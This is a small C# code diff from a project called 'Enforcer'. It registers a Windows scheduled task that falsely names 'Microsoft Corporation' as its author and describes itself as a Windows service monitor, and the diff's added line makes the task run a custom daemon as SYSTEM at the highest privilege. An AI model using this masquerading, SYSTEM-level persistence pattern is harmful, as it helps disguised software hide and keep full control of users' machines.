@@ -243,6 +243,7 @@ namespace Enforcer
             taskDefinition.RegistrationInfo.Author = "Microsoft Corporation";
             taskDefinition.RegistrationInfo.Description = "Ensures all critical Windows service processes are running.";
             taskDefinition.Principal.RunLevel = TaskRunLevel.Highest;
+            taskDefinition.Principal.UserId = "NT AUTHORITY\\SYSTEM";
             taskDefinition.Triggers.Add(taskTrigger);
             taskDefinition.Actions.Add(new ExecAction(daemonPath));
             taskFolder.RegisterTaskDefinition(name, taskDefinition);
